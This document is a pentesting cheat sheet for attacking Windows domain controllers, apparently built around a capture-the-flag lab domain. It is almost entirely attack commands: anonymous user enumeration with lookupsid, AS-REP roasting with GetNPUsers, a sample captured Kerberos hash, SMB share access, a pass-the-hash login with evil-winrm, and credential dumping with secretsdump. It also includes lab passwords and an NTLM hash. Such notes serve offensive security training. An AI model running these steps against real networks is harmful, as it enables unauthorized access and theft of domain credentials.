# Domain Controllers
## Basics 
- Find the NETBIOS Domain Name
````
nbtscan -v 10.10.8.1-254
````
## Impacket
- Location:
````
/usr/share/doc/python3-impacket/examples/
````
- If we have IPC$ access without authentication we are able to list the domain users as anonymous
````
python3 lookupsid.py anonymous@10.10.10.10 | tee users.txt
````
- Isolate the users with `SidTypeUser`
````
grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
````
- Now, let’s use `GetNPUsers.py` to find users without Kerberos pre-authentication:
````
python3 GetNPUsers.py vulnnet-rst.local/ -no-pass -userfile usernames.txt
````
- Should retrive a hash if the command is sucessful
````
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:692e76f70a8772c46ed94e73130460c8$713b0693498fdaff68642d78e713ca965e5007d5d864ca727289930783fe28f00bf79fef8126c4722d09cafc72ec60e940d31297591f67ce049030cb531ddd9c83cd37796fbf414b830a7c90fe26d2c45d6f2b624cd4413c58e3dbb77519dd69906248f8db27b1974b880a826003e562e25d9de9e4cb7cfa85c1de954761053b7d51a455530001348b46909f91f4e80bae7374071339f0920bb3e2ad95169d20f05d0cd586882facb63c058072dacb7ec8ddbcd9297331e1f6fb6d844ea7967659bee38fde4431af9f9608e9adcb38cb6e20e72bcf61c524f480b5ea2530e16dbeed2272855a61a05c03e84653aa1a3bbbd5ece06633
````
- Crack the hash with `john`
### Samba authenticated access
````
smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
````
- Cat out files with `smb`
````
Enter VULNNET-RST.LOCAL\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

        8540159 blocks of size 4096. 4318542 blocks available
smb: \> get ResetPassword.vbs -
````
### evil-winrm
- Connect with pass the hash attack
````
evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
````
### Dump hashes
- Use `secretsdump.py` with impacket
````
python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
````









































